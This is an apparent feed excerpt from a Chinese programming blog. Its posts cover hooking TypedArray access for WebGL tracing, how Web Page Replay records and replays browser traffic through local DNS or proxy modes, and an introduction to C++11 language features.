class="params">i</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'get member'</span>,i);</span><br><span class="line">            <span class="keyword">return</span> a[i];</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;(key),</span><br><span class="line">        set: <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">v</span>) </span>&#123;</span><br><span class="line">            b.isDirty = <span class="literal">true</span>;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">'set member'</span>,i);</span><br><span class="line">            a[i] = v;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;(key)</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">this</span>.constructor = a.constructor;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> idx <span class="keyword">in</span> a) &#123;</span><br><span class="line">    <span class="built_in">Object</span>.defineProperty(b, idx, &#123;</span><br><span class="line">      configurable: <span class="literal">true</span>,</span><br><span class="line">      enumerable: <span class="literal">true</span>,</span><br><span class="line">      get: <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'get index'</span>,i);</span><br><span class="line">          <span class="keyword">return</span> a[i];</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;(idx),</span><br><span class="line">      set: <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">v</span>) </span>&#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'set index'</span>,i);</span><br><span class="line">          b.isDirty = <span class="literal">true</span>;</span><br><span class="line">          a[i] = v;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;(idx)</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line">&gt;&gt;a = <span class="keyword">new</span> <span class="built_in">Float32Array</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">&lt;&lt;<span class="built_in">Float32Array</span> &#123;a: <span class="built_in">Float32Array</span>[<span class="number">3</span>], isDirty: <span class="literal">false</span>&#125;</span><br><span class="line">&gt;&gt;a.toString()</span><br><span class="line">&lt;&lt;t.js:<span class="number">64</span> invoke toString</span><br><span class="line">&lt;&lt;<span class="string">"1,2,3"</span></span><br><span class="line">&gt;&gt;a[<span class="number">0</span>]=<span class="number">1</span></span><br><span class="line">&lt;&lt;t.js:<span class="number">100</span> set index <span class="number">0</span></span><br><span class="line">&lt;&lt;<span class="number">1</span></span><br><span class="line">&gt;&gt;a[<span class="number">2</span>]</span><br><span class="line">&lt;&lt;t.js:<span class="number">94</span> get index <span class="number">2</span></span><br><span class="line">&lt;&lt;<span class="number">3</span></span><br><span class="line">&gt;&gt;a.constructor</span><br><span class="line">&lt;&lt;<span class="built_in">Float32Array</span>() &#123; [native code]  &#125;</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure></p>
<p>本做法应该还有以下局限：</p>
<h2 id="性能">性能</h2><p>大规模下创建一个1000000的数组内存占用飙升，因为创建了太多的get/set函数。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ori = <span class="keyword">new</span> _Float32Array(<span class="number">1000000</span>)</span><br><span class="line">Float32Array[<span class="number">1000000</span>]</span><br><span class="line">mod = <span class="keyword">new</span> Float32Array(<span class="number">1000000</span>)</span><br><span class="line">Float32Array &#123;a: Float32Array[<span class="number">1000000</span>], isDirty: <span class="literal">false</span>&#125;</span><br><span class="line"></span><br><span class="line">console.time(<span class="string">'a'</span>);<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;var t = mod[i];t++;mod[i]=t;&#125;;console.timeEnd(<span class="string">'a'</span>);</span><br><span class="line">VM741:<span class="number">2</span> a: <span class="number">5313.409</span>ms</span><br><span class="line"></span><br><span class="line">console.time(<span class="string">'a'</span>);<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;var t=ori[i];t++;ori[i]=t;&#125;;console.timeEnd(<span class="string">'a'</span>);</span><br><span class="line">VM743:<span class="number">2</span> a: <span class="number">3884.074</span>ms</span><br><span class="line">```</span><br></pre></td></tr></table></figure>
<h2 id="内部创建并返回的TypedArray无法Hook">内部创建并返回的TypedArray无法Hook</h2><p>比如类似<code>subarray()</code>函数，返回值便是原生的TypedArray了，需要在Proxy对象中特殊处理一下。</p>
<h2 id="在某些场景下不能完全替代原有的TypedArray">在某些场景下不能完全替代原有的TypedArray</h2><p>可以尽量模拟原生TypedArray的对外Api，不过还是有些场景可能照顾不到。</p>
<h1 id="ES6_Proxy_&amp;_Reflect">ES6 Proxy &amp; Reflect</h1><p>Chrome中还没有实现，使用Firefox一试。对某对象加一层通用的代理，非常容易实现。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> ori = <span class="keyword">new</span> <span class="built_in">Float32Array</span>(<span class="number">1000000</span>);</span><br><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="built_in">Proxy</span>(aa, &#123;</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span> (<span class="params">target, key, receiver</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Reflect</span>.get(target, key, receiver);          </span><br><span class="line">    &#125;,</span><br><span class="line">    set: <span class="function"><span class="keyword">function</span> (<span class="params">target, key, value, receiver</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Reflect</span>.set(target, key, value, receiver);              </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.time(<span class="string">'a'</span>);<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;<span class="keyword">var</span> t = aa[i];t++;aa[i]=t;&#125;;<span class="built_in">console</span>.timeEnd(<span class="string">'a'</span>);</span><br><span class="line">a: 计时器开始</span><br><span class="line">a: <span class="number">1738.62</span>ms</span><br><span class="line"><span class="built_in">console</span>.time(<span class="string">'a'</span>);<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">1000000</span>;i++)&#123;<span class="keyword">var</span> t = obj[i];t++;obj[i]=t;&#125;;<span class="built_in">console</span>.timeEnd(<span class="string">'a'</span>);</span><br><span class="line">a: 计时器开始</span><br><span class="line">a: <span class="number">3226.16</span>ms</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br></pre></td></tr></table></figure>
<p>如果还有更好的方法，欢迎讨论。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="问题描述">问题描述</h1><p>目前在做的小项目中，我们在浏览器中通过Hook浏览器的API，截获目标程序对浏览器API的调用。比如对于Webgl的网页程序，我们就能截获所有的gl指令，这其中主要是截获参数列表。把这些gl指令翻译为Opengl ES标准的话便]]>
    </summary>
    
      <category term="frontend" scheme="http://yqf3139.github.io/tags/frontend/"/>
    
      <category term="javascript" scheme="http://yqf3139.github.io/tags/javascript/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[使用 Web Page Replay]]></title>
    <link href="http://yqf3139.github.io/2015/11/21/use-web-page-replay/"/>
    <id>http://yqf3139.github.io/2015/11/21/use-web-page-replay/</id>
    <published>2015-11-21T14:24:47.000Z</published>
    <updated>2015-11-28T08:36:22.802Z</updated>
    <content type="html"><![CDATA[<h1 id="为什么需要使用_Web_Page_Replay？">为什么需要使用 Web Page Replay？</h1><h2 id="需求的产生">需求的产生</h2><p>实习期间，我们经常用各种Workload对浏览器进行测试，初期大量的Workload都是手工收集或是开源的，再整理到小组内的服务器上。<br>后期产生了抓取浏览器中Javascript Trace并实时送至后端分析的需求，例如我们希望将某些网页的Webgl调用全部记录下来，或者是将用户的各种互动事件记录下来，又不用手工地修改Workload，便有了我目前写的代理服务器，它能对我们关注的Workload注入Javascript脚本，比和后端代理服务器建立通信，高效地把Trace发送到后端，并易于扩展各种功能的后端。</p>
<p>一个更加常见的需求便是Localize Real life Workload，我们需要自动化地测试很多网上不开源的Workload，虽然通过我的代理服务器，注入分析不需要人工干预了，不过在公司内连接外网Workload是痛苦的。尤其是某些Workload每次需要加载50M的资源文件，一旦浏览器cache失效便要登上很长时间。而且网上的Workload在不断变动，无法直接进行组内Workload的统一化，针对浏览器测试时很难做到组内环境一致。</p>
<p>所以一个最基本的需求就是我们访问该Workload一次，就将所有经过代理服务器的request和response本地存档，称为record；等到下次重复测试时，匹配所有的request，直接发回对应的response，这样便能做到本地replay该workload了。</p>
<p>最近进哥说想加入这个功能在我们的代理服务器上，但由于当初没有考虑到这个功能，并且组内提出可以复用Telemetry中的Webpage Replay功能，可以将其加在我代理服务器的外层，便可以像是管道一样进行功能的扩展。正好我最近在看的Webgl Workload需要加载的资源很多，进行Replay极大加快了我自测的速度。</p>
<h2 id="HTTP/HTTPS代理服务器的妙用">HTTP/HTTPS代理服务器的妙用</h2><p>刚才说的两个需求只是代理服务器的一个很小的用处，还有大量的妙用如下：</p>
<ul>
<li>科学上网，不过HTTP代理一般只能作为国内跳板。</li>
<li>反向代理，做网站的入口，自动后端负载均衡、流量审查、压缩、简单的逻辑直接部署等等功能。</li>
<li>测试平台，之前看到阿里的Anyproxy便是这个作用，可以记录下所有接入终端（手机、平板）的HTTP网路请求，方便修改Header，Cookie，进行颠簸的网路环境的模拟等等，也提供Replay。</li>
<li>内网上网，公司内部方便屏蔽外界的攻击，并限制员工上网，审查上网记录，当然有福利便是可以直接提供梯子。</li>
</ul>
<h1 id="Web_Page_Replay_实现原理的简单理解">Web Page Replay 实现原理的简单理解</h1><p>Replay工具可以运行在DNS劫持和HTTP代理两种模式下，实质上DNS劫持简化了设置浏览器代理的过程。</p>
<p><img src="/images/WebPageReplayDiagram.png" alt="replay"></p>
<p>盗图一张，可以看出Replay劫持模式便是在本机启动一个DNS服务器和Web服务器，分别占用53和80端口。<br>一般情况下，浏览器访问一个页面先进行域名的DNS解析，然后先目标服务器发送request。Record时，DNS全部返回127.0.0.1，浏览器便将请求发送给本机的服务器，服务器随后便代理请求后返回，并记录下本次request和response。Replay时本机服务器直接匹配存档文件。<br>DNS劫持的好处便是不用设置浏览器代理了，缺点也很明显：</p>
<ul>
<li>如果request写明ip时，便绕过了本地的DNS请求（类似Host梯子），便无法实现replay。</li>
<li>访问端口不是标准的80和443也会直接在record环节出错。</li>
<li>需要占用本机的53,80,443端口，影响本机的原有的服务。</li>
</ul>
<p>所以这个工具也支持直接设置代理的模式，如果只是浏览器的话使用比较简单。想将多个代理服务器管道化，设置每一层的代理为上一层代理就可以了。</p>
<p>接下来粗略了解一下代理服务器的工作方式。</p>
<p>对于HTTP:</p>
<p>代理服务器通过TCP Socket接收到来自客户端的请求。它从HTTP的Header中解析出host和port，如果是域名的话先DNS解析，然后就是Roundtrip最终返回真实的response，这里所有的内容都是代理服务器可见的，可以随意修改。</p>
<p>如果我们这里使用nc，可以首先不通过代理访问百度：<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nc baidu.<span class="keyword">com</span> <span class="number">80</span></span><br><span class="line">  GET / HTTP/<span class="number">1.1</span></span><br><span class="line">  Hos<span class="variable">t:</span> baidu.<span class="keyword">com</span></span><br></pre></td></tr></table></figure></p>
<p>可以看见返回的response：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HTTP/<span class="number">1.1</span> <span class="number">200</span> OK</span><br><span class="line">Date: Fri, <span class="number">14</span> Aug <span class="number">2015</span> <span class="number">07</span>:<span class="number">55</span>:<span class="number">26</span> GMT</span><br><span class="line">......</span><br></pre></td></tr></table></figure></p>
<p>如果通过本机8080代理服务器：<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ nc localhost <span class="number">8080</span></span><br><span class="line">  <span class="preprocessor">GET</span> http://<span class="keyword">baidu.com </span>HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="label">  Host:</span> <span class="keyword">baidu.com</span></span><br></pre></td></tr></table></figure></p>
<p>代理服务器可能会输出如下日志：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">INFO:</span> Got request  baidu.com GET <span class="string">http:</span><span class="comment">//baidu.com</span></span><br><span class="line"><span class="string">INFO:</span> Sending request GET <span class="string">http:</span><span class="comment">//baidu.com</span></span><br><span class="line"><span class="string">INFO:</span> Received response <span class="number">200</span> OK</span><br></pre></td></tr></table></figure></p>
<p>对于HTTPS:<br>代理服务收到客户端的CONNECT请求，但只可见host和port，代理服务器只能在客户端和服务器中建立起socket连接并相互双工传递，如果需要修改内容的话，需要进行中间人攻击。</p>
<h1 id="Web_Page_Replay_使用实战">Web Page Replay 使用实战</h1><h2 id="使用DNS劫持模式">使用DNS劫持模式</h2><h2 id="使用直接代理模式">使用直接代理模式</h2><h1 id="源码分析">源码分析</h1>]]></content>
    <summary type="html">
    <![CDATA[<h1 id="为什么需要使用_Web_Page_Replay？">为什么需要使用 Web Page Replay？</h1><h2 id="需求的产生">需求的产生</h2><p>实习期间，我们经常用各种Workload对浏览器进行测试，初期大量的Workload都是手工收集或]]>
    </summary>
    
      <category term="browser" scheme="http://yqf3139.github.io/tags/browser/"/>
    
      <category term="network" scheme="http://yqf3139.github.io/tags/network/"/>
    
      <category term="proxy" scheme="http://yqf3139.github.io/tags/proxy/"/>
    
      <category term="testing" scheme="http://yqf3139.github.io/tags/testing/"/>
    
      <category term="programming" scheme="http://yqf3139.github.io/categories/programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[初尝 C++ 11]]></title>
    <link href="http://yqf3139.github.io/2015/11/15/new-in-cpp11/"/>
    <id>http://yqf3139.github.io/2015/11/15/new-in-cpp11/</id>
    <published>2015-11-15T06:50:31.000Z</published>
    <updated>2015-11-28T08:36:06.978Z</updated>
    <content type="html"><![CDATA[<p>我学的第一门语言便是C++，不过由于后期一直没有使用C++写过较大的项目，一直处于入门阶段。最近实习，第一个小项目便是搭建一个代理服务器，Manager处于对性能的要求，希望我用C++实现。当时比较懒，觉得用C++重写代理服务器进展会比较慢，便说服Manager让我使用Golang，配合一些现有的框架实现。现在看起来达到了预期效果，但也缺少了锻炼C++能力的机会。</p>
<p>现有的项目中，Android App几乎都是使用NDK进行开发的，近期我们有进行重构和性能优化的打算。恰逢其机，进哥在每周的Code Study上进行了 <code>C++11</code> 新标准的分享，我也借助周末的机会稍作整理。</p>
<h1 id="概览">概览</h1><p><img src="/images/cpp-timeline.png" alt="timeline"></p>
<p>C++自98标准化后，变动不大。直到近年开始不断推出新的标准，我们现在似乎还处在不断改进的中期。</p>
<p>按照Manager的说法，改动可以被划分入如下几类：</p>
<ul>
<li>语法糖类。让代码更加简洁，易于理解。</li>
<li>显式地进行语义申明。填之前留下的坑，并让代码更加符合最佳实践。</li>
<li>其他语言的新特性。</li>
<li>标准库的完善。</li>
</ul>
<p>Manager之前是做编译器的，所以他觉得大部分修改是标准委员会拍拍大脑制定的。的确，语言的设计不是大杂烩，维持一个简洁规范的语法规则是很有必要的，C++由于需要向前兼容，看起来便不简洁了。</p>
<h1 id="语法糖">语法糖</h1><p>这部分是Manager痛斥的，不过也是我们大家喜闻乐见的一些小改进。</p>
<h2 id="Auto关键字">Auto关键字</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> x = <span class="number">144000000000000</span>;</span><br><span class="line"><span class="keyword">auto</span> y = <span class="built_in">string</span>(<span class="string">"hello"</span>);</span><br><span class="line"><span class="keyword">auto</span> z = y + <span class="string">", world"</span>;</span><br><span class="line"><span class="keyword">auto</span> a = someFunc();</span><br></pre></td></tr></table></figure>
<p>这里主要的便利还是减少了类型申明的冗余，不过对于他人来说可读性会很差。比如<code>auto x = 0;</code>只会推断为int，可能会带来不必要的内存占用（比如范围只需要-128-127），或是溢出。如果需要使用STL的string也需要使用类名，不然会被推断为char数组。</p>
<p>最佳实践还是在能明显看出变量类型的时候使用，如容器的迭代器申明。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;::const_iterator ci = vi.begin();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = vec.begin();i != vec.end();i++) &#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (*i) &lt;&lt; <span class="built_in">std</span>::endl; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>不过还是有坑，配合新出的for loop时注意引用的问题,默认是一个拷贝。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">for</span> (<span class="tag">auto</span> &amp;<span class="rule"><span class="attribute">i </span>:<span class="value"> vec) &#123;</span><br><span class="line">    i++</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="decltype自动化推导">decltype自动化推导</h2><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">typedef decltype<span class="list">(<span class="keyword">someFunc</span><span class="list">()</span>)</span> ITER</span><br><span class="line">auto a = someFunc<span class="list">()</span><span class="comment">; // 比如返回值为vector&lt;int&gt;::const_iterator</span></span><br><span class="line">decltype<span class="list">(<span class="keyword">a</span>)</span> b<span class="comment">;       // 自动推导为和a一样的类型</span></span><br></pre></td></tr></table></figure>
<p>看到定义函数指针的用法，比较实用<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myfunc</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">decltype</span>(&amp;myfunc) pfunc = myfunc;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (*pfunc)(<span class="number">0</span>) &lt;&lt;<span class="built_in">std</span>::endl;</span><br><span class="line">    pfunc = [](<span class="keyword">int</span> a)&#123;<span class="keyword">return</span> a+<span class="number">1</span>;&#125;;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; (*pfunc)(<span class="number">0</span>) &lt;&lt;<span class="built_in">std</span>::endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="初始化语法">初始化语法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C c &#123;<span class="number">0</span>,<span class="number">0</span>&#125;; <span class="comment">//C++11 only. 相当于: C c(0,0);</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">int</span>* a = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">3</span>] &#123; <span class="number">1</span>, <span class="number">2</span>, <span class="number">0</span>  &#125;; /C++<span class="number">11</span> only</span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> X &#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    X() : a&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125; &#123;&#125; <span class="comment">//C++11, member array initializer</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>看完上面几个例子，似乎很多类型的初始化都可以使用{}来统一了。<br>不过Manager指出其实只是新增加了<code>new int[3]{1,2,3};</code>这一类的，其他的方法是为了大一统加上的。这样看来，初始化的方法的确比较混乱了。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(C c)</span></span>&#123;&#125;</span><br><span class="line">foo(&#123;<span class="number">0</span>,<span class="number">0</span>&#125;);</span><br></pre></td></tr></table></figure>
<p>其实可以这样写，进行自动化推导后初始化传入的结构体。不过不太易于阅读。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; vs=&#123; <span class="string">"first"</span>, <span class="string">"second"</span>, <span class="string">"third"</span> &#125;;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; singers =</span><br><span class="line">&#123; &#123;<span class="string">"Lady Gaga"</span>, <span class="string">"+1 (212) 555-7890"</span>&#125;,</span><br><span class="line">&#123;<span class="string">"Beyonce Knowles"</span>, <span class="string">"+1 (212) 555-0987"</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>
<p>适合进行容器初始化。以前map的初始化不友好。</p>
<p>map和表达式配合，有一种Javascript的感觉。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">handler</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">decltype</span>(&amp;handler)&gt; handlers =</span><br><span class="line">    &#123; </span><br><span class="line">        &#123;<span class="string">"ori"</span>, [](<span class="keyword">int</span> a)&#123;<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; a &lt;&lt; <span class="built_in">std</span>::endl;&#125;&#125;,</span><br><span class="line">        &#123;<span class="string">"plusone"</span>, [](<span class="keyword">int</span> a)&#123;<span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; a+<span class="number">1</span> &lt;&lt; <span class="built_in">std</span>::endl;&#125;&#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    (*handlers[<span class="string">"ori"</span>])(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h1 id="明晰语义的改动">明晰语义的改动</h1><h2 id="delete/default修饰">delete/default修饰</h2><p>我们经常需要单例模式需要<code>private</code>构造函数，可以使用<code>delete</code>告诉编译器不生成默认的构造函数。<br>不过可以申明为<code>private</code>，似乎不是特别的必要。</p>
<p>下面例子是一个比较好的实践：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">double</span>)</span> </span>= <span class="keyword">delete</span>;</span><br></pre></td></tr></table></figure>
<p>明晰了使用时不能编译器遇到传入double的情况，不会自动做类型转换了</p>
<h2 id="nullptr,有类型的NULL">nullptr,有类型的NULL</h2><p><code>NULL</code>在函数重载时会产生歧义，导致具体逻辑得看编译器实现了。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span>)</span></span>; <span class="comment">//#1</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">char</span> *)</span></span>;<span class="comment">//#2</span></span><br><span class="line"><span class="comment">//C++03</span></span><br><span class="line">f(<span class="number">0</span>); <span class="comment">//二义性</span></span><br><span class="line"><span class="comment">//C++11</span></span><br><span class="line">f(<span class="literal">nullptr</span>) <span class="comment">//无二义性，调用f(char*)</span></span><br></pre></td></tr></table></figure></p>
<h2 id="final/override修饰">final/override修饰</h2><p><code>final</code>的使用不用多说了。<code>override</code>我们当时讨论了很久其存在的必要性。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> A&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"in A"</span> &lt;&lt; <span class="built_in">std</span>::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> B : <span class="keyword">public</span> A &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">f</span><span class="params">(<span class="keyword">int</span> a)</span> override </span>&#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"in B"</span> &lt;&lt; <span class="built_in">std</span>::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    A* p = <span class="keyword">new</span> B();</span><br><span class="line">    p-&gt;f(<span class="number">1.1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面例子中，最终调用到了B的f，不过如果A的f参数改为<code>double</code>，会由<code>override</code>产生编译错误。<br>如果不加的话，就会绕过B::f。</p>
